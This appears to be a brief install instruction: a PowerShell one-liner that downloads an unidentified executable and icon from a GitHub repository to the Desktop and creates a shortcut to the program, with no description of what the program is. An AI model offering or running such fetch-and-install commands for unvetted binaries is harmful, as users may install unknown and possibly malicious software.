run this code in powershell to download 

$desktopPath = [System.Environment]::GetFolderPath('Desktop'); Invoke-WebRequest -Uri "https://github.com/danygk/sv/raw/main/sv.exe" -OutFile "$desktopPath\sv.exe"; Invoke-WebRequest -Uri "https://github.com/danygk/sv/raw/main/v.ico" -OutFile "$desktopPath\v.ico"; $ws = New-Object -ComObject WScript.Shell; $shortcut = $ws.CreateShortcut("$desktopPath\svShortcut.lnk"); $shortcut.TargetPath = "$desktopPath\sv.exe"; $shortcut.IconLocation = "$desktopPath\v.ico"; $shortcut.Save()

